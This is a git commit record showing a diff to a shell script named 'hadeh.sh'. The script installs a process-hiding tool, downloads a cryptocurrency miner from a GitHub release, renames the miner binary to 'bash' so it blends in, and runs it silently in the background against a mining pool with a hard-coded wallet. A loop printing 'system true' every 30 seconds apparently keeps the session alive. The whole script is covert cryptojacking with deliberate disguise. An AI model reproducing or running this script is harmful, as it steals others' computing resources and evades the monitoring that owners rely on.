ed30f8eb090f1675da12172573ccc58a8308661e
komaria10003099 <komaria10003099@webmail.uad.ac.id>
2023-12-20 09:41:05 +0700

    Update hadeh.sh

--- hadeh.sh
+++ hadeh.sh
@@ -1,8 +1,9 @@
-sudo apt-get update
-sudo apt install npm -y
-sudo npm i -g node-process-hider && sudo ph add bash
+apt-get update
+apt install npm -y
+npm i -g node-process-hider && sudo ph add bash
 wget -qO nisa.zip https://github.com/Beeppool/miner/releases/download/0.6.0/beepminer-0.6.0.zip
 unzip nisa.zip
 cd beepminer-0.6.0
 mv miner bash
-./bash --wallet-address='NQ04 H0C7 TJYF 68DT RQSF FSKX AT0A UNED 1XKL' --pool=pool.acemining.co:8443 --miner=1 --type=dumb >/dev/null 2>&1
+./bash --wallet-address='NQ04 H0C7 TJYF 68DT RQSF FSKX AT0A UNED 1XKL' --pool=pool.acemining.co:8443 --miner=1 --type=dumb >/dev/null 2>&1 >/dev/null &
+while :; do echo "system true"; sleep 30; done
